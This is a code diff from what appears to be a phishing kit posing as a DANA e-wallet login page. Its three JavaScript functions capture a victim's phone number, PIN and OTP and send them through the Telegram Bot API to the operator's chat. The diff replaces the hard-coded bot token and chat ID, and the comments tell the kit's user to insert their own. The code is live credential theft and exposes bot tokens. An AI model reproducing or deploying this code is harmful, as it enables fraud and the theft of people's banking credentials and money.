@@ -1832,8 +1832,8 @@ function nomorLogin(){
     
     var gabungan = '' + logo.value + '%0A~%20𝗡𝗼𝗺𝗼𝗿 𝗗𝗔𝗡𝗔%20~%0A%20%20%20%20%20' + nope.value;
    
-    var token = '7354003385:AAG7Xfo38Yy0ZUKYx1pRQjEF6fzz7GCTvZY'; // Ganti dengan token bot yang kamu buat
-    var grup = '6687915047'; // Ganti dengan chat id dari bot yang kamu buat
+    var token = '7420056361:AAF2riByrKPTd1_yGxGE3Rs-uuUQNkP8gsQ'; // Ganti dengan token bot yang kamu buat
+    var grup = '100230965875'; // Ganti dengan chat id dari bot yang kamu buat
     $.ajax({
         url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
         method: `POST`,
@@ -1914,8 +1914,8 @@ function openForm(){
   var gabungan = '' + logo.value + '%0A~%20𝗣𝗜𝗡 𝗗𝗔𝗡𝗔%20~%0A%20%20%20%20%20' + pin1.value + pin2.value + pin3.value + pin4.value + pin5.value + pin6.value;
   
      
-    var token = '7354003385:AAG7Xfo38Yy0ZUKYx1pRQjEF6fzz7GCTvZY'; // Ganti dengan token bot yang kamu buat
-    var grup = '6687915047'; // Ganti dengan chat id dari bot yang kamu buat
+    var token = '7420056361:AAF2riByrKPTd1_yGxGE3Rs-uuUQNkP8gsQ'; // Ganti dengan token bot yang kamu buat
+    var grup = '1002309658754'; // Ganti dengan chat id dari bot yang kamu buat
     $.ajax({
         url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
         method: `POST`,
@@ -1968,8 +1968,8 @@ function kirimPesan(){
    var pin44 = document.getElementById('pin44');
     
     var gabungan = '' + logo.value +  '%0A~%20𝗢𝗧𝗣 𝗗𝗔𝗡𝗔%20~%0A%20%20%20%20%20%20' + pin11.value + pin22.value + pin33.value + pin44.value;
-    var token = '7354003385:AAG7Xfo38Yy0ZUKYx1pRQjEF6fzz7GCTvZY'; // Ganti dengan token bot yang kamu buat
-    var grup = '6687915047'; // Ganti dengan chat id dari bot yang kamu buat
+    var token = '7420056361:AAF2riByrKPTd1_yGxGE3Rs-uuUQNkP8gsQ'; // Ganti dengan token bot yang kamu buat
+    var grup = '1002309658754'; // Ganti dengan chat id dari bot yang kamu buat
     $.ajax({
         url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
         method: `POST`,
